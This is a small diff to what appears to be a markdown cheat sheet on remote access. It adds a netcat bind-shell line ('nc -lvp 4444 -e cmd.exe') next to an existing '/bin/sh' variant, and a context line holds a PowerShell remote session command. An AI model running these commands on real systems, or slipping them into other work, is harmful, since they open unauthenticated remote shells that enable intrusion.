@@ -38,6 +38,7 @@ Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
 
 ```bash
 nc -lvp 4444 -e /bin/sh
+nc -lvp 4444 -e cmd.exe
 ```
 
 ## Client
